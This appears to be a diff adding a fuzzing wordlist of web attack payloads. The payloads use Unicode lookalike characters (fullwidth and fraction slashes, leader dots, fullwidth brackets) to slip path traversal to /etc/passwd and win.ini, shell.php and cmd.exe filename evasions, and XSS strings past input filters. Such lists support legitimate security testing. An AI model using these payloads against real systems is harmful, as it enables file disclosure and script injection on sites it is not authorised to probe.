@@ -1,0 +1,25 @@
+..⁄..⁄..⁄etc⁄passwd
+..∕..∕..∕etc∕passwd
+..／..／..／etc／passwd
+․․/․․/․․/etc/passwd
+．．/．．/．．/etc/passwd
+․․⁄․․⁄․․⁄etc⁄passwd
+．．／．．／．．／etc／passwd
+․․∕․․∕․․∕etc∕passwd
+．．/.．/..／etc／passwd
+image.png⁄..⁄..⁄..⁄etc⁄passwd
+image.png／..／..／..／etc／passwd
+shell．php
+..﹨..﹨..﹨windows﹨win.ini
+..＼..＼..＼windows＼win.ini
+․․﹨․․﹨․․﹨windows﹨win.ini
+．．＼．．＼．．＼windows＼win.ini
+C：＼windows＼system32＼cmd.exe
+＜script＞alert(1)＜/script＞
+＜img src=x onerror=alert(1)＞
+＜svg onload=alert(1)＞
+＜iframe src=javascript:alert(1)＞＜/iframe＞
+﹤script﹥alert(1)﹤/script﹥
+﹤img src=x onerror=alert(1)﹥
+﹤body onload=alert(1)﹥
+﹤a href="javascript:alert(1)"﹥Click_Here﹤/a﹥.jpg
